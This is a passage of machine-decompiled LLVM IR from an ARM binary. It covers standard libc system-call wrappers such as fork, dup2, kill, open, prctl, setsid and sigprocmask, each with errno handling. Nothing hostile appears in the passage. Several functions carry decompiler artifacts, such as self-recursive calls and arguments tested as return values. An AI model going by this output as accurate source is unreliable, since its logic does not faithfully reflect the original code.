  %v6_125f8 = and i32 %v5_125f8, %arg1
  %tmp10 = mul i32 %v3_125f4, -65536
  %v5_125fc = add i32 %tmp10, -1
  %v6_125fc = and i32 %v5_125fc, %arg3
  %v2_12600 = mul i32 %v6_125fc, %v6_125f8
  %v2_12604 = mul i32 %v6_125fc, %v3_125f0
  %v2_12608 = mul i32 %v6_125f8, %v3_125f4
  %v2_12610 = add i32 %v2_12604, %v2_12608
  %v3_12610 = icmp ult i32 %v2_12610, %v2_12604
  br i1 %v3_12610, label %bb, label %bb9

bb:                                               ; preds = %entry
  br label %bb9

bb9:                                              ; preds = %entry, %bb
  %v4_12618 = mul i32 %v2_12610, 65536
  %v5_12618 = add i32 %v4_12618, %v2_12600
  ret i32 %v5_12618

; uselistorder directives
  uselistorder i32 %v2_12604, { 1, 0 }
  uselistorder i32 %v6_125f8, { 1, 0 }
  uselistorder i32 %v3_125f4, { 1, 0 }
  uselistorder i32 %v3_125f0, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_12640 = call i32 @vfork()
  store i32 %v0_12640, i32* @r0, align 4
  %v2_12644 = icmp ugt i32 %v0_12640, -4097
  br i1 %v2_12644, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_12658, %entry
  %merge = phi i32 [ %v0_12640, %entry ], [ %v0_12658, %dec_label_pc_12658 ]
  ret i32 %merge

bb1:                                              ; preds = %entry
  %v4_12650 = icmp eq i32 %v0_12640, -38
  br i1 %v4_12650, label %dec_label_pc_12658, label %bb2

dec_label_pc_12658:                               ; preds = %bb1
  %v0_12658 = call i32 @fork()
  store i32 %v0_12658, i32* @r0, align 4
  %v2_1265c = icmp ugt i32 %v0_12658, -4097
  br i1 %v2_1265c, label %bb2, label %bb

bb2:                                              ; preds = %bb1, %dec_label_pc_12658
  %v0_12664 = call i32 @__syscall_error()
  ret i32 %v0_12664

; uselistorder directives
  uselistorder i32 %v0_12658, { 1, 2, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_12670 = load i32, i32* @r2, align 4
  %v1_12680 = add i32 %arg2, -12
  store i32 %v6_12670, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_12680, 2
  br i1 %tmp, label %dec_label_pc_126a8, label %dec_label_pc_126a0

dec_label_pc_126a0:                               ; preds = %entry
  %v0_126a0 = call i32 @__GI_fcntl64()
  br label %dec_label_pc_126d4

dec_label_pc_126a8:                               ; preds = %entry
  %v2_126b0 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_126b0, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_126b0, -4095
  br i1 %tmp8, label %dec_label_pc_126d4, label %dec_label_pc_126c0

dec_label_pc_126c0:                               ; preds = %dec_label_pc_126a8
  %v0_126c0 = call i32 @__errno_location()
  %v0_126c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_126c4 = sub i32 0, %v0_126c4
  %v2_126c8 = inttoptr i32 %v0_126c0 to i32*
  store i32 %v1_126c4, i32* %v2_126c8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_126d4

dec_label_pc_126d4:                               ; preds = %dec_label_pc_126c0, %dec_label_pc_126a8, %dec_label_pc_126a0
  %storemerge = phi i32 [ %v0_126a0, %dec_label_pc_126a0 ], [ %v2_126b0, %dec_label_pc_126a8 ], [ -1, %dec_label_pc_126c0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_126b0, { 1, 0, 2 }
}

define i32 @__GI_fcntl64() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_12704 = load i32, i32* @r0, align 4
  store i32 %v0_12704, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12704, -4095
  br i1 %tmp, label %dec_label_pc_12720, label %dec_label_pc_12710

dec_label_pc_12710:                               ; preds = %entry
  %v0_12710 = call i32 @__errno_location()
  %v0_12714 = load i32, i32* %r4.global-to-local, align 4
  %v1_12714 = sub i32 0, %v0_12714
  %v2_12718 = inttoptr i32 %v0_12710 to i32*
  store i32 %v1_12714, i32* %v2_12718, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12720

dec_label_pc_12720:                               ; preds = %entry, %dec_label_pc_12710
  %v0_12720 = phi i32 [ %v0_12704, %entry ], [ -1, %dec_label_pc_12710 ]
  ret i32 %v0_12720

; uselistorder directives
  uselistorder i32 %v0_12704, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12720, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @access() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1275c = load i32, i32* @r4, align 4
  store i32 %v3_1275c, i32* %stack_var_-8, align 4
  %v0_12760 = call i32 @access()
  store i32 %v0_12760, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12760, -4095
  br i1 %tmp, label %dec_label_pc_12780, label %dec_label_pc_12770

dec_label_pc_12770:                               ; preds = %entry
  %v0_12770 = call i32 @__errno_location()
  %v0_12774 = load i32, i32* %r4.global-to-local, align 4
  %v1_12774 = sub i32 0, %v0_12774
  %v2_12778 = inttoptr i32 %v0_12770 to i32*
  store i32 %v1_12774, i32* %v2_12778, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12780

dec_label_pc_12780:                               ; preds = %entry, %dec_label_pc_12770
  %v0_12780 = phi i32 [ %v0_12760, %entry ], [ -1, %dec_label_pc_12770 ]
  %v2_12784 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12784, i32* @r4, align 4
  ret i32 %v0_12780

; uselistorder directives
  uselistorder i32 %v0_12760, { 1, 0, 2 }
  uselistorder i32 ()* @access, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12780, { 1, 0 }
}

define i32 @chdir() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12788 = load i32, i32* @r4, align 4
  store i32 %v3_12788, i32* %stack_var_-8, align 4
  %v0_1278c = call i32 @chdir()
  store i32 %v0_1278c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1278c, -4095
  br i1 %tmp, label %dec_label_pc_127ac, label %dec_label_pc_1279c

dec_label_pc_1279c:                               ; preds = %entry
  %v0_1279c = call i32 @__errno_location()
  %v0_127a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_127a0 = sub i32 0, %v0_127a0
  %v2_127a4 = inttoptr i32 %v0_1279c to i32*
  store i32 %v1_127a0, i32* %v2_127a4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_127ac

dec_label_pc_127ac:                               ; preds = %entry, %dec_label_pc_1279c
  %v0_127ac = phi i32 [ %v0_1278c, %entry ], [ -1, %dec_label_pc_1279c ]
  %v2_127b0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_127b0, i32* @r4, align 4
  ret i32 %v0_127ac

; uselistorder directives
  uselistorder i32 %v0_1278c, { 1, 0, 2 }
  uselistorder i32 ()* @chdir, { 1, 0 }
  uselistorder label %dec_label_pc_127ac, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_127b4 = load i32, i32* @r4, align 4
  store i32 %v3_127b4, i32* %stack_var_-8, align 4
  %v1_127b8 = call i32 @close(i32 %arg1)
  store i32 %v1_127b8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_127b8, -4095
  br i1 %tmp, label %dec_label_pc_127d8, label %dec_label_pc_127c8

dec_label_pc_127c8:                               ; preds = %entry
  %v0_127c8 = call i32 @__errno_location()
  %v0_127cc = load i32, i32* %r4.global-to-local, align 4
  %v1_127cc = sub i32 0, %v0_127cc
  %v2_127d0 = inttoptr i32 %v0_127c8 to i32*
  store i32 %v1_127cc, i32* %v2_127d0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_127d8

dec_label_pc_127d8:                               ; preds = %entry, %dec_label_pc_127c8
  %v0_127d8 = phi i32 [ %v1_127b8, %entry ], [ -1, %dec_label_pc_127c8 ]
  %v2_127dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_127dc, i32* @r4, align 4
  ret i32 %v0_127d8

; uselistorder directives
  uselistorder i32 %v1_127b8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_127d8, { 1, 0 }
}

define i32 @dup2() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_127e0 = load i32, i32* @r4, align 4
  store i32 %v3_127e0, i32* %stack_var_-8, align 4
  %v0_127e4 = call i32 @dup2()
  store i32 %v0_127e4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_127e4, -4095
  br i1 %tmp, label %dec_label_pc_12804, label %dec_label_pc_127f4

dec_label_pc_127f4:                               ; preds = %entry
  %v0_127f4 = call i32 @__errno_location()
  %v0_127f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_127f8 = sub i32 0, %v0_127f8
  %v2_127fc = inttoptr i32 %v0_127f4 to i32*
  store i32 %v1_127f8, i32* %v2_127fc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12804

dec_label_pc_12804:                               ; preds = %entry, %dec_label_pc_127f4
  %v0_12804 = phi i32 [ %v0_127e4, %entry ], [ -1, %dec_label_pc_127f4 ]
  %v2_12808 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12808, i32* @r4, align 4
  ret i32 %v0_12804

; uselistorder directives
  uselistorder i32 %v0_127e4, { 1, 0, 2 }
  uselistorder i32 ()* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12804, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1280c = load i32, i32* @r4, align 4
  store i32 %v3_1280c, i32* %stack_var_-8, align 4
  %v0_12810 = call i32 @fork()
  store i32 %v0_12810, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12810, -4095
  br i1 %tmp, label %dec_label_pc_12830, label %dec_label_pc_12820

dec_label_pc_12820:                               ; preds = %entry
  %v0_12820 = call i32 @__errno_location()
  %v0_12824 = load i32, i32* %r4.global-to-local, align 4
  %v1_12824 = sub i32 0, %v0_12824
  %v2_12828 = inttoptr i32 %v0_12820 to i32*
  store i32 %v1_12824, i32* %v2_12828, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12830

dec_label_pc_12830:                               ; preds = %entry, %dec_label_pc_12820
  %v0_12830 = phi i32 [ %v0_12810, %entry ], [ -1, %dec_label_pc_12820 ]
  %v2_12834 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12834, i32* @r4, align 4
  ret i32 %v0_12830

; uselistorder directives
  uselistorder i32 %v0_12810, { 1, 0, 2 }
  uselistorder i32 ()* @fork, { 1, 0 }
  uselistorder label %dec_label_pc_12830, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_1283c = ptrtoint i32* %stack_var_-12 to i32
  %v2_12848 = call i32 @getrlimit(i32 7, i32 %v2_1283c)
  %v1_1284c = icmp slt i32 %v2_12848, 0
  br i1 %v1_1284c, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v5_12854 = load i32, i32* %stack_var_-12, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_1285c = phi i32 [ 256, %entry ], [ %v5_12854, %bb ]
  ret i32 %v5_1285c

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12860 = load i32, i32* @r4, align 4
  store i32 %v3_12860, i32* %stack_var_-8, align 4
  %v0_12868 = load i32, i32* @r0, align 4
  store i32 %v0_12868, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12868, -4095
  br i1 %tmp, label %dec_label_pc_12884, label %dec_label_pc_12874

dec_label_pc_12874:                               ; preds = %entry
  %v0_12874 = call i32 @__errno_location()
  %v0_12878 = load i32, i32* %r4.global-to-local, align 4
  %v1_12878 = sub i32 0, %v0_12878
  %v2_1287c = inttoptr i32 %v0_12874 to i32*
  store i32 %v1_12878, i32* %v2_1287c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_12888.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12884

dec_label_pc_12884:                               ; preds = %entry, %dec_label_pc_12874
  %v2_12888 = phi i32 [ %v3_12860, %entry ], [ %v2_12888.pre, %dec_label_pc_12874 ]
  %v0_12884 = phi i32 [ %v0_12868, %entry ], [ -1, %dec_label_pc_12874 ]
  store i32 %v2_12888, i32* @r4, align 4
  ret i32 %v0_12884

; uselistorder directives
  uselistorder i32 %v0_12868, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12884, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1288c = load i32, i32* @r4, align 4
  store i32 %v3_1288c, i32* %stack_var_-8, align 4
  %v0_12890 = call i32 @getpid()
  store i32 %v0_12890, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12890, -4095
  br i1 %tmp, label %dec_label_pc_128b0, label %dec_label_pc_128a0

dec_label_pc_128a0:                               ; preds = %entry
  %v0_128a0 = call i32 @__errno_location()
  %v0_128a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_128a4 = sub i32 0, %v0_128a4
  %v2_128a8 = inttoptr i32 %v0_128a0 to i32*
  store i32 %v1_128a4, i32* %v2_128a8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_128b0

dec_label_pc_128b0:                               ; preds = %entry, %dec_label_pc_128a0
  %v0_128b0 = phi i32 [ %v0_12890, %entry ], [ -1, %dec_label_pc_128a0 ]
  %v2_128b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_128b4, i32* @r4, align 4
  ret i32 %v0_128b0

; uselistorder directives
  uselistorder i32 %v0_12890, { 1, 0, 2 }
  uselistorder label %dec_label_pc_128b0, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_128b8 = load i32, i32* @r4, align 4
  store i32 %v3_128b8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_128dc, label %dec_label_pc_128cc

dec_label_pc_128cc:                               ; preds = %entry
  %v0_128cc = call i32 @__errno_location()
  %v0_128d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_128d0 = sub i32 0, %v0_128d0
  %v2_128d4 = inttoptr i32 %v0_128cc to i32*
  store i32 %v1_128d0, i32* %v2_128d4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_128e0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_128dc

dec_label_pc_128dc:                               ; preds = %entry, %dec_label_pc_128cc
  %v2_128e0 = phi i32 [ %v3_128b8, %entry ], [ %v2_128e0.pre, %dec_label_pc_128cc ]
  %v0_128dc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_128cc ]
  store i32 %v2_128e0, i32* @r4, align 4
  ret i32 %v0_128dc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_128dc, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_12900 = load i32, i32* @r0, align 4
  %v3_12900 = call i32 @ioctl(i32 %v0_12900, i32 %arg1, i32 %arg2)
  store i32 %v3_12900, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_12900, -4095
  br i1 %tmp, label %dec_label_pc_12920, label %dec_label_pc_12910

dec_label_pc_12910:                               ; preds = %entry
  %v0_12910 = call i32 @__errno_location()
  %v0_12914 = load i32, i32* %r4.global-to-local, align 4
  %v1_12914 = sub i32 0, %v0_12914
  %v2_12918 = inttoptr i32 %v0_12910 to i32*
  store i32 %v1_12914, i32* %v2_12918, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12920

dec_label_pc_12920:                               ; preds = %entry, %dec_label_pc_12910
  %v0_12920 = phi i32 [ %v3_12900, %entry ], [ -1, %dec_label_pc_12910 ]
  ret i32 %v0_12920

; uselistorder directives
  uselistorder i32 %v3_12900, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12920, { 1, 0 }
}

define i32 @kill() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12934 = load i32, i32* @r4, align 4
  store i32 %v3_12934, i32* %stack_var_-8, align 4
  %v0_12938 = call i32 @kill()
  store i32 %v0_12938, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12938, -4095
  br i1 %tmp, label %dec_label_pc_12958, label %dec_label_pc_12948

dec_label_pc_12948:                               ; preds = %entry
  %v0_12948 = call i32 @__errno_location()
  %v0_1294c = load i32, i32* %r4.global-to-local, align 4
  %v1_1294c = sub i32 0, %v0_1294c
  %v2_12950 = inttoptr i32 %v0_12948 to i32*
  store i32 %v1_1294c, i32* %v2_12950, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12958

dec_label_pc_12958:                               ; preds = %entry, %dec_label_pc_12948
  %v0_12958 = phi i32 [ %v0_12938, %entry ], [ -1, %dec_label_pc_12948 ]
  %v2_1295c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1295c, i32* @r4, align 4
  ret i32 %v0_12958

; uselistorder directives
  uselistorder i32 %v0_12938, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12958, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_12970 = and i32 %arg2, 64
  %v2_12970 = icmp eq i32 %v1_12970, 0
  br i1 %v2_12970, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v6_12960 = load i32, i32* @r2, align 4
  %phitmp = urem i32 %v6_12960, 65536
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v0_12980 = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_12980, i32* @r2, align 4
  %v4_12988 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_1298c = icmp eq i32 %v4_12988, -4096
  store i1 %v7_1298c, i1* @cpsr_z, align 1
  store i32 %v4_12988, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_12988, -4095
  br i1 %tmp, label %dec_label_pc_129a8, label %dec_label_pc_12998

dec_label_pc_12998:                               ; preds = %.thread1
  %v0_12998 = call i32 @__errno_location()
  %v0_1299c = load i32, i32* %r4.global-to-local, align 4
  %v1_1299c = sub i32 0, %v0_1299c
  %v2_129a0 = inttoptr i32 %v0_12998 to i32*
  store i32 %v1_1299c, i32* %v2_129a0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_129a8

dec_label_pc_129a8:                               ; preds = %.thread1, %dec_label_pc_12998
  %v0_129a8 = phi i32 [ %v4_12988, %.thread1 ], [ -1, %dec_label_pc_12998 ]
  ret i32 %v0_129a8

; uselistorder directives
  uselistorder i32 %v4_12988, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_129a8, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %v0_129c4 = load i32, i32* @r0, align 4
  %v2_129c4 = inttoptr i32 %v0_129c4 to i8*
  %v3_129c4 = call i32 @__libc_open(i8* %v2_129c4, i32 577)
  %v0_129c8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_129c8, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v6_129c8 = and i32 %v3_129c4, 36
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v7_129c8 = phi i32 [ %v3_129c4, %entry ], [ %v6_129c8, %bb ]
  ret i32 %v7_129c8

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_129cc = load i32, i32* @r4, align 4
  store i32 %v3_129cc, i32* %stack_var_-8, align 4
  %v1_129d0 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_129d0 = call i32 @pipe([2 x i32] %v1_129d0)
  store i32 %v2_129d0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_129d0, -4095
  br i1 %tmp, label %dec_label_pc_129f0, label %dec_label_pc_129e0

dec_label_pc_129e0:                               ; preds = %entry
  %v0_129e0 = call i32 @__errno_location()
  %v0_129e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_129e4 = sub i32 0, %v0_129e4
  %v2_129e8 = inttoptr i32 %v0_129e0 to i32*
  store i32 %v1_129e4, i32* %v2_129e8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_129f0

dec_label_pc_129f0:                               ; preds = %entry, %dec_label_pc_129e0
  %v0_129f0 = phi i32 [ %v2_129d0, %entry ], [ -1, %dec_label_pc_129e0 ]
  %v2_129f4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_129f4, i32* @r4, align 4
  ret i32 %v0_129f0

; uselistorder directives
  uselistorder i32 %v2_129d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_129f0, { 1, 0 }
}

define i32 @prctl() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_129f8 = load i32, i32* @r4, align 4
  store i32 %v3_129f8, i32* %stack_var_-8, align 4
  %v0_12a00 = call i32 @prctl()
  store i32 %v0_12a00, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12a00, -4095
  br i1 %tmp, label %dec_label_pc_12a20, label %dec_label_pc_12a10

dec_label_pc_12a10:                               ; preds = %entry
  %v0_12a10 = call i32 @__errno_location()
  %v0_12a14 = load i32, i32* %r4.global-to-local, align 4
  %v1_12a14 = sub i32 0, %v0_12a14
  %v2_12a18 = inttoptr i32 %v0_12a10 to i32*
  store i32 %v1_12a14, i32* %v2_12a18, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12a20

dec_label_pc_12a20:                               ; preds = %entry, %dec_label_pc_12a10
  %v0_12a20 = phi i32 [ %v0_12a00, %entry ], [ -1, %dec_label_pc_12a10 ]
  %v2_12a24 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12a24, i32* @r4, align 4
  ret i32 %v0_12a20

; uselistorder directives
  uselistorder i32 %v0_12a00, { 1, 0, 2 }
  uselistorder i32 ()* @prctl, { 1, 0 }
  uselistorder label %dec_label_pc_12a20, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12a28 = load i32, i32* @r4, align 4
  store i32 %v3_12a28, i32* %stack_var_-8, align 4
  %v1_12a2c = load i32, i32* @r1, align 4
  %v2_12a2c = inttoptr i32 %v1_12a2c to i32*
  %v3_12a2c = load i32, i32* @r2, align 4
  %v4_12a2c = call i32 @read(i32 %arg1, i32* %v2_12a2c, i32 %v3_12a2c)
  store i32 %v4_12a2c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_12a2c, -4095
  br i1 %tmp, label %dec_label_pc_12a4c, label %dec_label_pc_12a3c

dec_label_pc_12a3c:                               ; preds = %entry
  %v0_12a3c = call i32 @__errno_location()
  %v0_12a40 = load i32, i32* %r4.global-to-local, align 4
  %v1_12a40 = sub i32 0, %v0_12a40
  %v2_12a44 = inttoptr i32 %v0_12a3c to i32*
  store i32 %v1_12a40, i32* %v2_12a44, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12a4c

dec_label_pc_12a4c:                               ; preds = %entry, %dec_label_pc_12a3c
  %v0_12a4c = phi i32 [ %v4_12a2c, %entry ], [ -1, %dec_label_pc_12a3c ]
  %v2_12a50 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12a50, i32* @r4, align 4
  ret i32 %v0_12a4c

; uselistorder directives
  uselistorder i32 %v4_12a2c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12a4c, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12a54 = load i32, i32* @r4, align 4
  store i32 %v3_12a54, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12a7c, label %dec_label_pc_12a6c

dec_label_pc_12a6c:                               ; preds = %entry
  %v0_12a6c = call i32 @__errno_location()
  %v0_12a70 = load i32, i32* %r4.global-to-local, align 4
  %v1_12a70 = sub i32 0, %v0_12a70
  %v2_12a74 = inttoptr i32 %v0_12a6c to i32*
  store i32 %v1_12a70, i32* %v2_12a74, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_12a80.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12a7c

dec_label_pc_12a7c:                               ; preds = %entry, %dec_label_pc_12a6c
  %v2_12a80 = phi i32 [ %v3_12a54, %entry ], [ %v2_12a80.pre, %dec_label_pc_12a6c ]
  %v0_12a7c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_12a6c ]
  store i32 %v2_12a80, i32* @r4, align 4
  ret i32 %v0_12a7c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12a7c, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12a84 = load i32, i32* @r4, align 4
  store i32 %v3_12a84, i32* %stack_var_-8, align 4
  %v0_12a88 = call i32 @setsid()
  store i32 %v0_12a88, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12a88, -4095
  br i1 %tmp, label %dec_label_pc_12aa8, label %dec_label_pc_12a98

dec_label_pc_12a98:                               ; preds = %entry
  %v0_12a98 = call i32 @__errno_location()
  %v0_12a9c = load i32, i32* %r4.global-to-local, align 4
  %v1_12a9c = sub i32 0, %v0_12a9c
  %v2_12aa0 = inttoptr i32 %v0_12a98 to i32*
  store i32 %v1_12a9c, i32* %v2_12aa0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12aa8

dec_label_pc_12aa8:                               ; preds = %entry, %dec_label_pc_12a98
  %v0_12aa8 = phi i32 [ %v0_12a88, %entry ], [ -1, %dec_label_pc_12a98 ]
  %v2_12aac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12aac, i32* @r4, align 4
  ret i32 %v0_12aa8

; uselistorder directives
  uselistorder i32 %v0_12a88, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12aa8, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12ab0 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_12ab0, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_12ab85 = load i32, i32* @r4, align 4
  store i32 %v3_12ab85, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12ad8

bb:                                               ; preds = %entry
  %v3_12ab8 = load i32, i32* @r4, align 4
  store i32 %v3_12ab8, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_12ad8, label %dec_label_pc_12ac4

dec_label_pc_12ac4:                               ; preds = %bb
  %v0_12ac4 = call i32 @__errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_12ad0 = inttoptr i32 %v0_12ac4 to i32*
  store i32 22, i32* %v2_12ad0, align 4
  %v0_12afc.pre = load i32, i32* %r2.global-to-local, align 4
